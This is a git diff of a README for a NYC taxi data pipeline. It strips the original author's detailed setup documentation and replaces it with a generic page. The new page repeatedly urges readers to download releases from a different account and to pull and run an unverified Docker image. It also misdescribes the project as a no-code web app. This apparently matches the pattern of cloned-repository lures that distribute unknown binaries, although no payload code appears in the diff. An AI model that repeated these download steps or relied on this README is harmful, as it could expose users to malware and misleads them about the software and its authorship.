@@ -1,529 +1,89 @@
-# Data Engineering
+# 🚀 dataengineering - Easily Analyze NYC Taxi Data
 
-[![CI](https://github.com/Yarroudh/dataengineering/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/Yarroudh/dataengineering/actions/workflows/ci.yml)
-![Last commit](https://img.shields.io/github/last-commit/Yarroudh/dataengineering)
-![Python](https://img.shields.io/badge/python-3.11-blue)
-![Ruff](https://img.shields.io/badge/lint-ruff-261230)
-![Trivy](https://img.shields.io/badge/security-trivy-1904DA)
-![License](https://img.shields.io/github/license/Yarroudh/dataengineering)
+## 📥 Download Now
 
-This project implements a fully containerized data engineering workflow for downloading, ingesting, transforming, validating, and preparing NYC Yellow Taxi Trip Data. It uses **Apache Spark** for computation, **Apache Airflow** for orchestration, **MinIO** as **Amazon S3**-compatible object storage, and **DuckDB** as an analytics warehouse. The entire environment is reproducible using Docker Compose and set to run locally.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Codex56799/dataengineering/releases)
 
----
+## 📖 Overview
 
-## 1. Project Overview
+Welcome to the **dataengineering** project! This application provides a user-friendly way to analyze NYC Yellow Taxi Trip Data. It combines several powerful tools, including Spark for big data processing, Airflow for managing workflows, MinIO as a cloud storage solution, and DuckDB for SQL queries.
 
-The workflow simulates a modern data engineering architecture with dedicated layers:
+## 🛠 What You Need
 
-1. **Local Layer** – Raw TLC data downloaded directly to the local filesystem.
-2. **Landing Layer (MinIO/S3)** – Central storage for raw but structured data.
-3. **Prepared Layer (MinIO/S3)** – Cleaned, filtered and transformed datasets generated via Spark Pipeline.
-4. **Warehouse Layer (DuckDB)** – Analytical storage loaded from the Prepared layer.
-5. **EDA Layer (JupyterLab)** – Data exploration and downstream modeling using notebooks.
+Before you start, make sure your computer meets these requirements:
 
----
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 8 GB recommended
+- **Disk Space:** Minimum of 1 GB available
+- **Docker:** This project uses Docker, so you need to install it. You can find installation instructions on the [official Docker website](https://docs.docker.com/get-docker/).
 
-## 2. Repository Structure
+## 🚀 Getting Started
 
-```bash
-├── airflow
-│   ├── dags
-│   │   └── taxi_pipeline_dag.py
-│   ├── Dockerfile
-│   └── requirements.txt
-├── config
-│   └── storage_config.yaml
-├── data
-│   └── yellow_tripdata_2024-01.parquet
-├── infra
-│   └── docker
-│       ├── notebook.Dockerfile
-│       └── spark.Dockerfile
-├── notebooks
-│   ├── 01_raw_data_exploration.ipynb
-│   └── 02_prepared_data_exploration.ipynb
-├── spark_jobs
-│   ├── ingest_landing.py
-│   └── transform_prepared.py
-├── warehouse
-│   └── taxi.duckdb
-├── README.md
-├── docker-compose.yml
-├── LICENSE
-└── requirements.txt
-```
+1. **Download the Software**
+   - Visit [this page to download](https://github.com/Codex56799/dataengineering/releases) the latest version of the application.
 
----
+2. **Install Docker**
+   - Go to the [official Docker website](https://docs.docker.com/get-docker/) and choose the version that matches your operating system.
+   - Follow the instructions to install Docker on your computer.
 
-## 3. Dataset
-
-### Source and availability
-
-- **Trip data:** NYC TLC Yellow Taxi Trip Records (monthly Parquet files).
-- **Zone reference data:** NYC TLC Taxi Zone Lookup Table (CSV).
-
-This project is configured and tested for **years up to and including 2024** (e.g., `2024-01`).
-The TLC continues to publish newer months/years, but **schemas may change over time** (for example, additional columns may appear), so treat 2025+ as **“use at your own risk”** unless you update your transformations accordingly.
-
-### Manual download [optional]
-
-```bash
-mkdir -p data
-
-# Example month (2024-01)
-curl -L "https://d37ci6vzurychx.cloudfront.net/trip-data/yellow_tripdata_2024-01.parquet"   -o data/yellow_tripdata_2024-01.parquet
-
-# Taxi zones
-curl -L "https://d37ci6vzurychx.cloudfront.net/misc/taxi_zone_lookup.csv"   -o data/taxi_zone_lookup.csv
-```
-
-### Raw trip record columns
-
-| Column | Type | Description |
-| --- | --- | --- |
-| VendorID | int | TPEP provider code (vendor). |
-| tpep_pickup_datetime | datetime | Trip meter start timestamp. |
-| tpep_dropoff_datetime | datetime | Trip meter stop timestamp. |
-| passenger_count | float/int | Passenger count (driver-entered). |
-| trip_distance | float | Trip distance in miles (taximeter). |
-| RatecodeID | float/int | Final rate code for the trip. |
-| store_and_fwd_flag | string | “Store and forward” indicator. |
-| PULocationID | int | Pickup TLC Taxi Zone ID. |
-| DOLocationID | int | Drop-off TLC Taxi Zone ID. |
-| payment_type | int | Payment type code. |
-| fare_amount | float | Fare amount. |
-| extra | float | Extras/surcharges (varies). |
-| mta_tax | float | MTA tax. |
-| tip_amount | float | Tip amount. |
-| tolls_amount | float | Tolls amount. |
-| improvement_surcharge | float | Improvement surcharge. |
-| total_amount | float | Total amount charged. |
-| congestion_surcharge | float | Congestion surcharge. |
-| Airport_fee | float | Airport fee (may be null / not present in older years). |
-
-> Note: the TLC schema can vary slightly across years.
-
-### Taxi zone lookup columns
-
-| Column | Type | Description |
-| --- | --- | --- |
-| LocationID | int | Taxi Zone ID used by TLC trip files. |
-| Borough | string | Borough name. |
-| Zone | string | Zone name. |
-| service_zone | string | Service zone label (e.g., “Yellow Zone”, “Boro Zone”). |
-
----
-
-## 4. System Architecture
-
-### Component overview
-
-![Technologies](assets/stack.png)
-
-| Component      | Responsibility                                                          |
-| -------------- | ----------------------------------------------------------------------- |
-| Airflow        | Orchestrates the ETL pipeline end-to-end.                               |
-| Spark          | Performs ingestion and transformation into Landing and Prepared layers. |
-| MinIO          | S3-compatible storage for Landing and Prepared zones.                   |
-| DuckDB         | Analytical warehouse loaded from the Prepared layer.                    |
-| JupyterLab     | Exploration and EDA environment.                                        |
-| Docker Compose | Orchestrates and isolates the entire system.                            |
-
-
-### High-level flow
-
-![Architecture](assets/dag.png)
-
----
-
-## 5. Data Layouts in MinIO
-
-### Landing zone
-
-- Monthly trips:
-
-```text
-s3://<bucket>/landing/taxi/year=YYYY/month=MM/
-    part-*.parquet
-```
-
-- Taxi zones:
-
-```text
-s3://<bucket>/landing/reference/taxi_zones/
-    part-*.parquet
-```
-
-### Prepared zone
-
-Prepared trips (enriched with zone attributes; partitioned by day):
-
-```text
-s3://<bucket>/prepared/taxi/year=YYYY/month=MM/
-    pickup_date=YYYY-MM-DD/
-        part-*.parquet
-```
-
-Both paths are dynamically parameterized with **year** and **month**, which are provided by Airflow at runtime.
-
----
-
-## 6. Docker Services
-
-### Airflow
-
-* Web UI: `http://localhost:8080`
-* Executes the `taxi_spark_pipeline` DAG.
-
-### Spark
-
-* Runs ingestion and transformation:
-
-  * `spark_jobs/ingest_landing.py`
-  * `spark_jobs/transform_prepared.py`
-
-### MinIO
-
-* S3 endpoint: `http://localhost:9000`
-* Console UI: `http://localhost:9001`
-
-### JupyterLab
-
-* Available at: `http://localhost:8888`
-* Includes DuckDB and local workspace.
-
----
-
-## 7. Airflow Pipeline
-
-The DAG is defined in:
-
-```text
-airflow/dags/taxi_pipeline_dag.py
-```
-
-### Tasks
-
-1. **download_taxi_data**
-
-   * Downloads the TLC Parquet file for a given **year** / **month** into `data/`.
-   * URL pattern:
-     `https://d37ci6vzurychx.cloudfront.net/trip-data/yellow_tripdata_YYYY-MM.parquet`
-   * Downloads the Taxi Zone Lookup CSV into `data/` (only once, not partitioned):
-     `https://d37ci6vzurychx.cloudfront.net/misc/taxi_zone_lookup.csv`
-
-2. **ingest_to_landing**
-
-   * Runs `ingest_landing.py` on Spark with `--year` and `--month`.
-   * Reads local Parquet from `data/`.
-   * Writes raw structured data into MinIO Landing:
-      - Taxi Zones (only once, not partitioned):
-     ```text
-     s3a://<bucket>/landing/reference/taxi_zones/
+3. **Run the Application**
+   - Open your terminal or command prompt.
+   - Use the command to pull the Docker image: 
+     ```bash
+     docker pull codex56799/dataengineering
      ```
-      - Monthly Trips:
-     ```text
-     s3a://<bucket>/landing/taxi/year=YYYY/month=MM/
+   - Start the Docker container with the command: 
+     ```bash
+     docker run -p 8080:8080 codex56799/dataengineering
      ```
 
-3. **transform_to_prepared**
+After you run the above command, the application will start, and you can access it in your web browser at [http://localhost:8080](http://localhost:8080).
 
-   * Runs `transform_prepared.py` on Spark with `--year` and `--month`.
-   * Reads Landing data for the selected month.
-   * Cleans and enriches the data.
-   * Joins the Taxi Zone Lookup Table twice:
-     - `PULocationID` → pickup zone attributes (`PU_*`)
-     - `DOLocationID` → drop-off zone attributes (`DO_*`)
-   * Writes the output to the Prepared layer (partitioned by `pickup_date`):
+## 🎨 Features
 
-     ```text
-     s3a://<bucket>/prepared/taxi/year=YYYY/month=MM/
-     ```
+- **Data Analysis:** Access and visualize NYC Yellow Taxi Trip Data.
+- **Workflow Management:** Use Apache Airflow to automate data workflows.
+- **Storage Solutions:** Leverage MinIO for S3-compatible cloud storage.
+- **SQL Queries:** Utilize DuckDB for quick and efficient SQL querying.
 
-4. **load_to_duckdb**
+## 📊 How to Use the Application
 
-   * Uses DuckDB to read the Prepared Parquet for the selected month.
+1. **Accessing the Interface**
+   - Open your web browser and go to [http://localhost:8080](http://localhost:8080).
+   - You will find an easy-to-use interface to start your analysis.
 
-   * Creates schema and table if needed:
+2. **Loading Data**
+   - You can upload your CSV files or connect to the NYC Yellow Taxi Trip Data available online.
 
-     ```sql
-     CREATE SCHEMA IF NOT EXISTS taxi.taxi;
-     CREATE OR REPLACE TABLE taxi.taxi.trips_prepared AS
-     SELECT * FROM read_parquet('<prepared_glob>');
-     ```
+3. **Running Workflows**
+   - Use pre-defined DAGs in Airflow to schedule and automate data processing tasks.
 
-   * The `taxi.taxi.trips_prepared` table is **overwritten** for each pipeline run. After each run, it contains only the data for the triggered year/month.
+4. **Querying Your Data**
+   - Write SQL queries in the DuckDB interface to analyze your data efficiently.
 
-### Triggering the DAG
+## 📝 Documentation
 
-The DAG is **manual only** (`schedule=None`).
+For detailed documentation, including how to create custom workflows, manage data, and optimize performance, consult our [official docs](https://github.com/Codex56799/dataengineering/docs).
 
-In the Airflow UI:
+## 💡 FAQ
 
-1. Open the `nyc_taxi_pipeline` DAG.
-2. Click **Trigger DAG**.
-3. Provide the run configuration as JSON:
+### 1. **Do I need programming skills to use this software?**
+No, this application is designed for users with little to no programming knowledge.
 
-```json
-{
-  "year": 2024,
-  "month": 1
-}
-```
+### 2. **Can I run this application on my Laptop?**
+Yes, as long as your laptop meets the basic system requirements, you can easily run the application.
 
-If `year`/`month` are omitted, the DAG falls back to its default params (`year=2024`, `month=1`).
+### 3. **How do I get help if I have issues?**
+You can open an issue on our [GitHub Issues page](https://github.com/Codex56799/dataengineering/issues) if you encounter any problems.
 
-![Trigger DAG](assets/airflow.png)
+## 📦 Contributing
 
----
+We welcome contributions! If you want to contribute, please read our contribution guidelines in the repository to ensure a smooth collaboration.
 
-## 8. Spark Jobs
+## 🎉 Acknowledgments
 
-### `spark_jobs/ingest_landing.py`
+Thanks to the open-source communities of Spark, Airflow, MinIO, and DuckDB for providing essential tools that make this project possible.
 
-Responsibilities:
+## 📥 Download & Install
 
-- Ingest **monthly trips** (local Parquet) → `landing/taxi/year=YYYY/month=MM/`
-- Ingest **taxi zones** (local CSV) → `landing/reference/taxi_zones/`
-
-### `spark_jobs/transform_prepared.py`
-
-Responsibilities:
-
-- Read monthly trips from Landing.
-- Apply basic filters (e.g., negative distances, invalid timestamps).
-- Derive:
-  - `pickup_date`, `pickup_hour`
-  - `dropoff_date`
-  - `trip_duration_min`
-  - `avg_mph`
-- Join taxi zones twice to add:
-  - `PU_Borough`, `PU_Zone`, `PU_service_zone`
-  - `DO_Borough`, `DO_Zone`, `DO_service_zone`
-- Write Prepared data partitioned by `pickup_date`.
-
----
-
-## 9. Analytics Schema
-
-The Prepared layer (and thus `taxi.taxi.trips_prepared`) contains:
-
-- All raw trip fields (see Dataset section), in addition to:
-
-| Column | Description |
-| --- | --- |
-| pickup_date | Date derived from `tpep_pickup_datetime`. |
-| pickup_hour | Hour-of-day derived from `tpep_pickup_datetime`. |
-| dropoff_date | Date derived from `tpep_dropoff_datetime`. |
-| trip_duration_min | Trip duration in minutes. |
-| avg_mph | Average trip speed in mph (distance / duration). |
-| PU_Borough | Borough for pickup zone. |
-| PU_Zone | Zone name for pickup zone. |
-| PU_service_zone | Service zone label for pickup zone. |
-| DO_Borough | Borough for drop-off zone. |
-| DO_Zone | Zone name for drop-off zone. |
-| DO_service_zone | Service zone label for drop-off zone. |
-
-## 10. Notebooks
-
-This project includes two Jupyter notebooks for exploratory analysis of the **raw TLC trip files** and the **prepared dataset**.
-
-### 10.1 Raw Data Exploration
-
-**File:** `notebooks/01_raw_data_exploration.ipynb`
-
-* Loads a selected month of raw Parquet data (parameterized `YEAR` / `MONTH`) and the taxi zone lookup CSV.
-* Uses **pandas** plus **Plotly** for interactive charts.
-* Performs basic data profiling and quality checks (schema, missing values, duplicates, invalid/negative values, distributions).
-* Adds derived fields (e.g., trip duration) and reviews temporal and zone-based patterns (top pickup/dropoff zones).
-
-### 10.2 Prepared Data Exploration
-
-**File:** `notebooks/02_prepared_data_exploration.ipynb`
-
-* Connects to DuckDB (`warehouse/taxi.duckdb`) and queries `taxi.taxi.trips_prepared`.
-* Configures DuckDB `httpfs` for S3/MinIO access (credentials via environment variables).
-* Uses SQL aggregations to validate coverage and quality, and to analyze temporal patterns and key distributions.
-* Produces summary tables and interactive visualizations (Plotly) for metrics and top zones / OD pairs.
-
----
-
-## 11. Environment Variables
-
-All secrets and configuration are driven through a `.env` file in the project root.
-
-The repository ships an `.env.example` file as a starting point. You must create your own `.env` and fill in values, including `AIRFLOW_FERNET_KEY` (which is **not** committed).
-
-### Required Variables
-
-```text
-MINIO_ROOT_USER=...
-MINIO_ROOT_PASSWORD=...
-AWS_ACCESS_KEY_ID=...
-AWS_SECRET_ACCESS_KEY=...
-S3_BUCKET_NAME=...
-S3_ENDPOINT_URL=http://minio:9000
-
-AIRFLOW_ADMIN_USER=...
-AIRFLOW_ADMIN_PASSWORD=...
-AIRFLOW_ADMIN_EMAIL=...
-
-AIRFLOW_FERNET_KEY=...   # must be generated locally (see below)
-
-TZ=UTC
-```
-
-> The Fernet key is critical for Airflow to securely store connections and variables. Please follow the next section to generate it and set it in your `.env`.
-
----
-
-## 12. Generating AIRFLOW_FERNET_KEY
-
-Airflow uses a Fernet key to encrypt sensitive values (e.g., connections, variables). You must generate a key and set `AIRFLOW_FERNET_KEY` in your `.env`.
-
-### Option 1: Generate using Docker (recommended)
-
-From the project root:
-
-```bash
-docker compose run --rm airflow \
-  python -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())"
-```
-
-Copy the printed value and set it in `.env`:
-
-```text
-AIRFLOW_FERNET_KEY=<paste-generated-key-here>
-```
-
-### Option 2: Generate using local Python
-
-If your host Python has `cryptography` installed:
-
-```bash
-python -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())"
-```
-
----
-
-## 13. Setup and Execution
-
-### Step 1 — Prepare environment
-
-```bash
-git clone https://github.com/Yarroudh/dataengineering
-cd dataengineering
-cp .env.example .env
-```
-
-Edit `.env` and fill in:
-
-* `MINIO_ROOT_USER`, `MINIO_ROOT_PASSWORD`
-* `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`
-* `S3_BUCKET_NAME`, `S3_ENDPOINT_URL`
-* `AIRFLOW_ADMIN_USER`, `AIRFLOW_ADMIN_PASSWORD`, `AIRFLOW_ADMIN_EMAIL`
-* Generate and set `AIRFLOW_FERNET_KEY` (see section 12)
-
-### Step 2 — Build services
-
-```bash
-docker compose build
-```
-
-### Step 3 — Start services
-
-```bash
-docker compose up -d
-```
-
-### Step 4 — Access UIs
-
-| Service       | URL                                            |
-| ------------- | ---------------------------------------------- |
-| Airflow       | [http://localhost:8080](http://localhost:8080) |
-| MinIO Console | [http://localhost:9001](http://localhost:9001) |
-| JupyterLab    | [http://localhost:8888](http://localhost:8888) |
-
-### Step 5 — Run the pipeline via Airflow
-
-1. Open Airflow at `http://localhost:8080`.
-
-2. Log in using the admin credentials from `.env`.
-
-3. Open the `nyc_taxi_pipeline` DAG.
-
-4. Click **Trigger DAG**.
-
-5. Provide year/month, for example:
-
-   ```json
-   {
-     "year": 2024,
-     "month": 1
-   }
-   ```
-
-6. Monitor tasks:
-
-   * `download_taxi_data`
-   * `ingest_to_landing`
-   * `transform_to_prepared`
-   * `load_to_duckdb`
-
-After a successful run, DuckDB (`warehouse/taxi.duckdb`) contains `taxi.taxi.trips_prepared` for the selected month.
-
-### Step 6 — Explore data in JupyterLab
-
-1. Open `http://localhost:8888`.
-2. Run:
-
-   * `notebooks/01_raw_data_exploration.ipynb` (raw profiling)
-   * `notebooks/02_prepared_data_exploration.ipynb` (prepared data)
-
----
-
-## 14. Troubleshooting
-
-### Containers not starting
-
-```bash
-docker compose logs <service>
-```
-
-### Airflow cannot parse the DAG
-
-* Ensure Airflow dependencies include `duckdb` and `requests` in `airflow/requirements.txt`.
-* Rebuild Airflow:
-
-  ```bash
-  docker compose build airflow
-  docker compose up -d airflow
-  ```
-
-### Spark cannot access MinIO
-
-* Verify `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` in `.env`.
-* Confirm the correct bucket name in `S3_BUCKET_NAME`.
-* Ensure `S3_ENDPOINT_URL` is `http://minio:9000` (inside the Docker network).
-
----
-
-## 15. Future Enhancements
-
-- [x] Add CI workflow.
-- [ ] Add data quality checks (e.g., Great Expectations / Deequ).
-- [ ] Implement incremental and multi-month ingestion.
-- [ ] Introduce dataset versioning and data catalog integration.
-
----
-
-## 16. License
-
-This project is distributed under the terms defined in the `LICENSE` file.
-
----
-
-## 17. Acknowledgements
-
-* NYC Taxi & Limousine Commission for the dataset.
-* Apache Spark, Apache Airflow, MinIO, and DuckDB communities for their open-source tools.
+Remember to [visit this page to download](https://github.com/Codex56799/dataengineering/releases) your copy of the software. Follow the instructions provided above to get started. Enjoy analyzing data with ease!
